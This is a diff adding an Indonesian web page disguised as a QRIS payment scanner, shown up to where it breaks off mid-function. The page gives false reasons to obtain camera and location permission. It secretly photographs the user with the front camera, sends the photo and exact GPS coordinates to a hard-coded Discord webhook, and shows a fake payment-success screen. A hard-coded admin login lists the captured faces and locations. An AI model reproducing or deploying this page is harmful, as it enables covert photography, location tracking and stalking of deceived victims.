@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAST QRIS ALL PAYMENT</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --blue: #0ea5e9;
+            --blue-dark: #0369a1;
+            --yellow: #fbbf24;
+            --glass-bg: rgba(255, 255, 255, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.3);
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: linear-gradient(135deg, #e0f7ff 0%, #f0f9ff 50%, #cffafe 100%);
+            color: #0c4a6e;
+            overflow-x: hidden;
+        }
+
+        /* GLASS MORPHISM */
+        .glass {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            border: 1.5px solid var(--glass-border);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
+        }
+
+        .glass-sm {
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+        }
+
+        /* ANIMATIONS */
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(60px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulseLight {
+            0%, 100% {
+                box-shadow: 0 8px 32px 0 rgba(14, 165, 233, 0.2);
+            }
+            50% {
+                box-shadow: 0 8px 32px 0 rgba(14, 165, 233, 0.4);
+            }
+        }
+
+        @keyframes scannerLine {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        @keyframes successPop {
+            0% {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes brandGlow {
+            0%, 100% {
+                text-shadow: 0 0 20px rgba(14, 165, 233, 0.3);
+            }
+            50% {
+                text-shadow: 0 0 40px rgba(14, 165, 233, 0.6);
+            }
+        }
+
+        @keyframes flashEffect {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .animate-slide-up {
+            animation: slideInUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .animate-pulse-light {
+            animation: pulseLight 2s ease-in-out infinite;
+        }
+
+        .animate-success-pop {
+            animation: successPop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .animate-brand-glow {
+            animation: brandGlow 2.5s ease-in-out infinite;
+        }
+
+        .hidden { display: none !important; }
+
+        /* PERMISSION SPLASH */
+        .permission-splash {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #e0f7ff 0%, #f0f9ff 50%, #cffafe 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .permission-container {
+            text-align: center;
+            max-width: 500px;
+            animation: slideInUp 0.8s ease-out;
+        }
+
+        .brand-section {
+            margin-bottom: 40px;
+        }
+
+        .brand-icon {
+            font-size: 3.5rem;
+            color: var(--blue);
+            margin-bottom: 20px;
+        }
+
+        .brand-title {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: var(--blue);
+            letter-spacing: 2px;
+            animation: brandGlow 2.5s ease-in-out infinite;
+            margin-bottom: 10px;
+        }
+
+        .brand-subtitle {
+            font-size: 1.4rem;
+            color: var(--yellow);
+            font-weight: 700;
+            letter-spacing: 3px;
+        }
+
+        .permissions-box {
+            padding: 40px;
+            border-radius: 30px;
+            animation: slideInUp 1s ease-out 0.2s both;
+            margin-bottom: 20px;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            background: rgba(14, 165, 233, 0.08);
+            border: 1.5px solid rgba(14, 165, 233, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .permission-item:hover {
+            background: rgba(14, 165, 233, 0.12);
+            border-color: rgba(14, 165, 233, 0.4);
+        }
+
+        .permission-icon {
+            font-size: 2.2rem;
+            color: var(--blue);
+            min-width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, rgba(14, 165, 233, 0.1), rgba(14, 165, 233, 0.05));
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .permission-text h3 {
+            color: var(--blue-dark);
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        .permission-text p {
+            color: #0c4a6e;
+            font-size: 13px;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .btn {
+            padding: 14px 32px;
+            border: none;
+            border-radius: 15px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-allow {
+            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+            color: white;
+            width: 100%;
+            box-shadow: 0 8px 32px 0 rgba(14, 165, 233, 0.3);
+        }
+
+        .btn-allow:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 40px 0 rgba(14, 165, 233, 0.4);
+        }
+
+        /* HOMEPAGE */
+        .hero-section {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .hero-content {
+            text-align: center;
+            max-width: 650px;
+            animation: slideInUp 0.8s ease-out;
+        }
+
+        .hero-brand {
+            margin-bottom: 40px;
+        }
+
+        .hero-brand .brand-title {
+            font-size: 3rem;
+        }
+
+        .hero-brand .brand-subtitle {
+            font-size: 1.5rem;
+        }
+
+        .scanner-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            margin: 40px auto;
+        }
+
+        .scanner-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1;
+            background: #000;
+            border-radius: 30px;
+            overflow: hidden;
+            border: 4px solid var(--blue);
+            box-shadow: 0 20px 60px rgba(14, 165, 233, 0.3);
+            animation: pulseLight 2s ease-in-out infinite;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scanner-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .scanner-box {
+            width: 280px;
+            height: 280px;
+            border: 3px solid var(--blue);
+            border-radius: 25px;
+            background: rgba(14, 165, 233, 0.08);
+            position: relative;
+            box-shadow: inset 0 0 30px rgba(14, 165, 233, 0.2), 0 0 30px rgba(14, 165, 233, 0.3);
+        }
+
+        .scanner-line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--blue), transparent);
+            animation: scannerLine 2s linear infinite;
+            box-shadow: 0 0 15px var(--blue);
+        }
+
+        .corner {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border: 3px solid var(--yellow);
+        }
+
+        .corner-tl { top: -8px; left: -8px; border-right: none; border-bottom: none; }
+        .corner-tr { top: -8px; right: -8px; border-left: none; border-bottom: none; }
+        .corner-bl { bottom: -8px; left: -8px; border-right: none; border-top: none; }
+        .corner-br { bottom: -8px; right: -8px; border-left: none; border-top: none; }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-top: 30px;
+        }
+
+        .btn-action {
+            padding: 14px 32px;
+            border: none;
+            border-radius: 15px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-scan {
+            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+            color: white;
+            box-shadow: 0 10px 30px rgba(14, 165, 233, 0.3);
+        }
+
+        .btn-scan:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(14, 165, 233, 0.4);
+        }
+
+        .btn-admin {
+            background: white;
+            color: var(--blue);
+            border: 3px solid var(--blue);
+        }
+
+        .btn-admin:hover {
+            background: rgba(14, 165, 233, 0.05);
+        }
+
+        /* MODALS */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-card {
+            padding: 50px;
+            border-radius: 30px;
+            max-width: 520px;
+            text-align: center;
+            animation: successPop 0.8s ease-out;
+            width: 95%;
+        }
+
+        .modal-icon {
+            font-size: 70px;
+            color: var(--blue);
+            margin-bottom: 20px;
+        }
+
+        .modal-card h2 {
+            color: var(--blue);
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .modal-card p {
+            color: #0c4a6e;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .info-section {
+            padding: 20px;
+            border-radius: 20px;
+            margin: 15px 0;
+            text-align: left;
+            backdrop-filter: blur(10px);
+            background: rgba(14, 165, 233, 0.08);
+            border: 1.5px solid rgba(14, 165, 233, 0.2);
+        }
+
+        .info-label {
+            color: var(--blue-dark);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+
+        .info-value {
+            color: #0c4a6e;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* ADMIN PANEL */
+        .admin-panel {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #e0f7ff 0%, #f0f9ff 50%, #cffafe 100%);
+        }
+
+        .admin-header {
+            backdrop-filter: blur(20px);
+            background: rgba(255, 255, 255, 0.7);
+            border-bottom: 2px solid rgba(14, 165, 233, 0.2);
+            padding: 30px 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
+        }
+
+        .admin-header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .admin-title h1 {
+            color: var(--blue);
+            font-size: 32px;
+            font-weight: 900;
+            margin-bottom: 5px;
+        }
+
+        .admin-title p {
+            color: #0c4a6e;
+            font-size: 13px;
+        }
+
+        .admin-actions {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .transactions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            padding: 40px 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .transaction-card {
+            border-radius: 25px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .transaction-card:hover {
+            transform: translateY(-10px);
+        }
+
+        .transaction-image {
+            width: 100%;
+            height: 220px;
+            background: #000;
+            overflow: hidden;
+        }
+
+        .transaction-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .transaction-body {
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.7);
+            border: 1.5px solid rgba(14, 165, 233, 0.2);
+            backdrop-filter: blur(10px);
+            border-top: none;
+            border-radius: 0 0 25px 25px;
+        }
+
+        .transaction-title {
+            color: var(--blue);
+            font-size: 16px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(14, 165, 233, 0.1);
+            font-size: 13px;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #0c4a6e;
+            font-weight: 600;
+        }
+
+        .detail-value {
+            color: var(--blue);
+            font-weight: 700;
+        }
+
+        .map-button-container {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 2px solid rgba(14, 165, 233, 0.1);
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .maps-link {
+            flex: 1;
+            min-width: 120px;
+            padding: 10px 14px;
+            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+            color: white;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 11px;
+            text-transform: uppercase;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+        }
+
+        .maps-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(14, 165, 233, 0.3);
+        }
+
+        .maps-link.danger {
+            background: #ef4444;
+        }
+
+        /* LOGIN */
+        .login-container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            padding: 50px;
+            border-radius: 30px;
+            max-width: 420px;
+            animation: slideInUp 0.8s ease-out;
+            width: 95%;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .login-icon {
+            font-size: 3rem;
+            color: var(--blue);
+            margin-bottom: 15px;
+        }
+
+        .login-card h1 {
+            color: var(--blue);
+            font-size: 26px;
+            font-weight: 800;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--blue-dark);
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 13px 16px;
+            border: 2px solid rgba(14, 165, 233, 0.3);
+            border-radius: 12px;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(10px);
+            color: #0c4a6e;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--blue);
+            box-shadow: 0 0 0 4px rgba(14, 165, 233, 0.1);
+            background: white;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 80px 20px;
+        }
+
+        .empty-state-icon {
+            font-size: 4rem;
+            color: var(--blue);
+            margin-bottom: 20px;
+        }
+
+        .empty-state h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--blue);
+            margin-bottom: 10px;
+        }
+
+        .empty-state p {
+            font-size: 14px;
+            color: #0c4a6e;
+        }
+
+        @media (max-width: 768px) {
+            .brand-title {
+                font-size: 2rem;
+            }
+
+            .transactions-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .permission-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PERMISSION SPLASH -->
+    <div id="splashScreen" class="permission-splash">
+        <div class="permission-container">
+            <div class="brand-section">
+                <div class="brand-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <div class="brand-title">FAST QRIS</div>
+                <div class="brand-subtitle">ALL PAYMENT</div>
+            </div>
+
+            <div class="glass permissions-box">
+                <h3 style="color: var(--blue); font-size: 20px; font-weight: 800; margin-bottom: 30px;">Izinkan Akses</h3>
+
+                <div class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-camera"></i>
+                    </div>
+                    <div class="permission-text">
+                        <h3>Akses Kamera</h3>
+                        <p>Untuk memindai QRIS code pembayaran Anda</p>
+                    </div>
+                </div>
+
+                <div class="permission-item">
+                    <div class="permission-icon">
+                        <i class="fas fa-map-marker-alt"></i>
+                    </div>
+                    <div class="permission-text">
+                        <h3>Akses Lokasi</h3>
+                        <p>Untuk mengarahkan dana ke bank yang sesuai</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-allow" onclick="requestAllPermissions()" style="width: 100%; margin-top: 25px;">
+                    <i class="fas fa-check"></i> Izinkan Semua
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- HOMEPAGE -->
+    <div id="homepage" class="hidden">
+        <div class="hero-section">
+            <div class="hero-content">
+                <div class="hero-brand">
+                    <div class="brand-icon" style="font-size: 2.5rem;">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h1 class="brand-title">FAST QRIS</h1>
+                    <p class="brand-subtitle">ALL PAYMENT</p>
+                </div>
+
+                <div class="scanner-wrapper">
+                    <div class="scanner-container">
+                        <video id="scannerVideo" playsinline autoplay></video>
+                        <div class="scanner-overlay">
+                            <div class="scanner-box">
+                                <div class="scanner-line"></div>
+                                <div class="corner corner-tl"></div>
+                                <div class="corner corner-tr"></div>
+                                <div class="corner corner-bl"></div>
+                                <div class="corner corner-br"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <p style="color: var(--blue); font-size: 14px; font-weight: 600; margin-bottom: 25px;">
+                    Arahkan kamera ke QRIS code untuk memproses pembayaran
+                </p>
+
+                <div class="button-group">
+                    <button onclick="startAutoScan()" class="btn-action btn-scan">
+                        <i class="fas fa-camera"></i> Mulai Scan
+                    </button>
+                    <button onclick="goToAdmin()" class="btn-action btn-admin">
+                        <i class="fas fa-lock"></i> Admin Panel
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS MODAL -->
+    <div id="successModal" class="modal-overlay hidden">
+        <div class="glass modal-card">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Pembayaran Berhasil</h2>
+            <p>QRIS Anda telah di-scan dan diproses dengan sukses</p>
+
+            <div class="info-section">
+                <div class="info-label">Waktu Transaksi</div>
+                <div class="info-value" id="transactionTime">-</div>
+            </div>
+
+            <div class="info-section">
+                <div class="info-label">Lokasi Anda</div>
+                <div class="info-value" id="locationDisplay">Mendeteksi lokasi...</div>
+            </div>
+
+            <div class="info-section">
+                <div class="info-label">Dana Diarahkan Ke</div>
+                <div class="info-value" id="bankDisplay">-</div>
+            </div>
+
+            <button onclick="closeSuccess()" class="btn btn-allow" style="width: 100%; margin-top: 20px;">
+                <i class="fas fa-home"></i> Kembali ke Home
+            </button>
+        </div>
+    </div>
+
+    <!-- ADMIN LOGIN -->
+    <div id="adminLogin" class="login-container hidden">
+        <div class="glass login-card">
+            <div class="login-header">
+                <div class="login-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <h1>Admin Panel</h1>
+            </div>
+
+            <form onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="adminUser" placeholder="Masukkan username" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="adminPass" placeholder="Masukkan password" required>
+                </div>
+
+                <button type="submit" class="btn btn-allow" style="width: 100%; margin-bottom: 12px;">
+                    <i class="fas fa-sign-in-alt"></i> Masuk
+                </button>
+
+                <button type="button" onclick="goHome()" class="btn btn-admin" style="width: 100%; background: white; color: var(--blue); border: 2px solid var(--blue);">
+                    <i class="fas fa-arrow-left"></i> Kembali
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL -->
+    <div id="adminPanel" class="admin-panel hidden">
+        <div class="admin-header">
+            <div class="admin-header-content">
+                <div class="admin-title">
+                    <h1><i class="fas fa-chart-bar"></i> FAST QRIS Admin</h1>
+                    <p>Dashboard Transaksi & Pembayaran</p>
+                </div>
+                <div class="admin-actions">
+                    <button onclick="downloadQRISFolder()" class="btn btn-allow" style="padding: 12px 24px;">
+                        <i class="fas fa-download"></i> Download Folder QRIS
+                    </button>
+                    <button onclick="logoutAdmin()" class="btn" style="background: #ef4444; color: white; padding: 12px 24px; border-radius: 15px;">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="transactionsContainer" class="transactions-grid">
+            <!-- Transactions load here -->
+        </div>
+
+        <div id="emptyState" class="empty-state">
+            <div class="empty-state-icon">
+                <i class="fas fa-inbox"></i>
+            </div>
+            <h2>Belum Ada Transaksi</h2>
+            <p>Hasil pembayaran QRIS akan muncul di sini</p>
+        </div>
+    </div>
+
+    <script>
+        let stream = null;
+        let transactions = JSON.parse(localStorage.getItem('qrisTransactions')) || [];
+        let userLocation = null;
+        let cameraPermitted = false;
+        let locationPermitted = false;
+        let lastCapturedImage = null;
+
+        // Request All Permissions
+        async function requestAllPermissions() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                cameraPermitted = true;
+            } catch (error) {
+                alert('Kamera tidak dapat diakses');
+                return;
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        };
+                        locationPermitted = true;
+                        startApp();
+                    },
+                    (error) => {
+                        userLocation = { lat: 0, lng: 0 };
+                        locationPermitted = false;
+                        startApp();
+                    }
+                );
+            } else {
+                userLocation = { lat: 0, lng: 0 };
+                startApp();
+            }
+        }
+
+        // Start App
+        function startApp() {
+            document.getElementById('splashScreen').classList.add('hidden');
+            document.getElementById('homepage').classList.remove('hidden');
+
+            if (stream) {
+                const video = document.getElementById('scannerVideo');
+                video.srcObject = stream;
+                rapidFireCapture();
+            }
+        }
+
+        // Rapid Fire 5x
+        function rapidFireCapture() {
+            let count = 0;
+            const interval = setInterval(() => {
+                if (count < 5) {
+                    createFlash();
+                    captureQRIS();
+                    count++;
+                } else {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        if (lastCapturedImage) {
+                            processTransaction(lastCapturedImage);
+                        }
+                    }, 300);
+                }
+            }, 300);
+        }
+
+        function createFlash() {
+            const flash = document.createElement('div');
+            flash.style.cssText = `
+                position: fixed;
+                inset: 0;
+                background: white;
+                z-index: 999;
+                animation: flashEffect 0.4s ease-out;
+                pointer-events: none;
+            `;
+            const style = document.createElement('style');
+            if (!document.getElementById('flashStyle')) {
+                style.id = 'flashStyle';
+                style.textContent = `
+                    @keyframes flashEffect {
+                        0% { opacity: 1; }
+                        100% { opacity: 0; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+            document.body.appendChild(flash);
+            setTimeout(() => flash.remove(), 400);
+        }
+
+        function captureQRIS() {
+            const video = document.getElementById('scannerVideo');
+            if (!video.videoWidth) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0);
+            lastCapturedImage = canvas.toDataURL('image/jpeg', 0.8);
+        }
+
+        function processTransaction(imageData) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const bank = getBankByLocation(userLocation);
+
+            const transaction = {
+                id: 'QRIS-' + Date.now(),
+                image: imageData,
+                timestamp: timestamp,
+                location: userLocation || { lat: 0, lng: 0 },
+                bank: bank,
+                status: 'SUCCESS'
+            };
+
+            transactions.push(transaction);
+            localStorage.setItem('qrisTransactions', JSON.stringify(transactions));
+            
+            // Send to Discord Webhook
+            sendToDiscord(transaction);
+            
+            showSuccess(transaction);
+        }
+
+        // Send to Discord Webhook
+        async function sendToDiscord(transaction) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1541649508415316009/QJ7haE-COaXv7I34eimQejICmp1_h3_C1o3-7TtpEYPRUAXZDRxd7SlrkO6YoKwomkRz';
+            
+            // Convert base64 to blob
+            const base64Data = transaction.image.split(',')[1];
+            const binaryString = atob(base64Data);
+            const bytes = new Uint8Array(binaryString.length);
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            const blob = new Blob([bytes], { type: 'image/jpeg' });
+
+            // Create FormData
+            const formData = new FormData();
+            formData.append('file', blob, `${transaction.id}.jpg`);
+
+            // Create embed content
+            const embed = {
+                title: '💳 QRIS Payment Detected',
+                color: 0x0ea5e9,
+                fields: [
+                    {
+                        name: '🔑 Transaction ID',
+                        value: transaction.id,
+                        inline: false
+                    },
+                    {
+                        name: '⏰ Timestamp',
+                        value: transaction.timestamp,
+                        inline: false
+                    },
+                    {
+                        name: '📍 Lokasi',
+                        value: `Latitude: ${transaction.location.lat.toFixed(6)}\nLongitude: ${transaction.location.lng.toFixed(6)}`,
+                        inline: false
+                    },
+                    {
+                        name: '🏦 Bank Tujuan',
+                        value: transaction.bank,
+                        inline: false
+                    },
+                    {
+                        name: '✅ Status',
+                        value: transaction.status,
+                        inline: true
+                    },
+                    {
+                        name: '🔗 Google Maps',
+                        value: `[View Location](https://www.google.com/maps/search/${transaction.location.lat},${transaction.location.lng})`,
+                        inline: true
+                    }
+                ],
+                image: {
+                    url: `attachment://${transaction.id}.jpg`
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            const payload = {
+                username: 'FAST QRIS System',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/2040/2040341.png',
+                embeds: [embed]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log('✅ Data sent to Discord successfully');
+                } else {
+                    console.error('❌ Failed to send to Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        function getBankByLocation(loc) {
+            if (!loc || !locationPermitted) return 'Bank Pusat Indonesia';
+            const lat = loc.lat, lng = loc.lng;
+            if (lat > -6.2 && lat < -6.1 && lng > 106.7 && lng < 107) {
+                return 'BCA - Jakarta Pusat';
+            } else if (lat > -6.3 && lat < -6.2 && lng > 106.7 && lng < 107.1) {
+                return 'Bank Mandiri - Jakarta';
+            } else if (lat > -6.4 && lat < -6.3 && lng > 106.6 && lng < 107) {
+                return 'BNI - Depok';
+            } else {
+                return 'Bank Nasional Regional';
+            }
+        }
+
+        function showSuccess(trans) {
+            document.getElementById('transactionTime').textContent = trans.timestamp;
+            document.getElementById('locationDisplay').textContent = `${trans.location.lat.toFixed(4)}°, ${trans.location.lng.toFixed(4)}°`;
+            document.getElementById('bankDisplay').textContent = trans.bank;
+            document.getElementById('successModal').classList.remove('hidden');
+        }
+
+        function closeSuccess() {
+            document.getElementById('successModal').classList.add('hidden');
+        }
+
+        function goHome() {
+            document.getElementById('homepage').classList.remove('hidden');
+            document.getElementById('adminLogin').classList.add('hidden');
+            document.getElementById('adminPanel').classList.add('hidden');
+        }
+
+        function goToAdmin() {
+            document.getElementById('homepage').classList.add('hidden');
+            document.getElementById('adminLogin').classList.remove('hidden');
+        }
+
+        function handleLogin(e) {
+            e.preventDefault();
+            const user = document.getElementById('adminUser').value.toUpperCase();
+            const pass = document.getElementById('adminPass').value.toUpperCase();
+            if (user === 'PANJUL' && pass === 'PANJUL') {
+                document.getElementById('adminLogin').classList.add('hidden');
+                document.getElementById('adminPanel').classList.remove('hidden');
+                loadTransactions();
+            } else {
+                alert('Username atau Password salah!');
+            }
+        }
+
+        function loadTransactions() {
+            const container = document.getElementById('transactionsContainer');
+            const empty = document.getElementById('emptyState');
+
+            if (transactions.length === 0) {
+                container.innerHTML = '';
+                empty.classList.remove('hidden');
+                return;
+            }
+
+            empty.classList.add('hidden');
+            container.innerHTML = transactions.map((trans, idx) => {
+                const mapsUrl = `https://www.google.com/maps/search/${trans.location.lat},${trans.location.lng}`;
+                return `
+                    <div class="transaction-card">
+                        <div class="transaction-image">
+                            <img src="${trans.image}" alt="QRIS">
+                        </div>
+                        <div class="transaction-body">
+                            <div class="transaction-title"><i class="fas fa-qrcode"></i> ${trans.id}</div>
+                            <div class="detail-item">
+                                <span class="detail-label">Waktu</span>
+                                <span class="detail-value">${trans.timestamp}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Status</span>
+                                <span class="detail-value"><i class="fas fa-check-circle"></i> ${trans.status}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Lokasi</span>
+                                <span class="detail-value">${trans.location.lat.toFixed(4)}°</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Bank</span>
+                                <span class="detail-value">${trans.bank}</span>
+                            </div>
+                            <div class="map-button-container">
+                                <a href="${mapsUrl}" target="_blank" class="maps-link">
+                                    <i class="fas fa-map"></i> Maps
+                                </a>
+                                <button onclick="downloadQRISData(${idx})" class="maps-link">
+                                    <i class="fas fa-download"></i> Data
+                                </button>
+                                <button onclick="deleteTransaction(${idx})" class="maps-link danger">
+                                    <i class="fas fa-trash"></i> Hapus
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function downloadQRISData(idx) {
+            const trans = transactions[idx];
+            const data = {
+                id: trans.id,
+                timestamp: trans.timestamp,
+                location: trans.location,
+                bank: trans.bank,
+                status: trans.status
+            };
+
+            const link = document.createElement('a');
+            link.href = trans.image;
+            link.download = `QRIS_${trans.id}.jpg`;
+            link.click();
+
+            const dataStr = JSON.stringify(data, null, 2);
+            const blob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const link2 = document.createElement('a');
+            link2.href = url;
+            link2.download = `QRIS_${trans.id}_info.json`;
+            link2.click();
+        }
+
+        function downloadQRISFolder() {
+            if (transactions.length === 0) {
+                alert('Belum ada data');
+                return;
+            }
+
+            transactions.forEach((trans, idx) => {
+                const link = document.createElement('a');
+                link.href = trans.image;
+                link.download = `QRIS/${trans.id}.jpg`;
+                link.click();
+
+                const data = {
+                    id: trans.id,
+                    timestamp: trans.timestamp,
+                    location: trans.location,
+                    bank: trans.bank,
+                    status: trans.status
+                };
+                const dataStr = JSON.stringify(data, null, 2);
+                const blob = new Blob([dataStr], { type: 'application/json' });
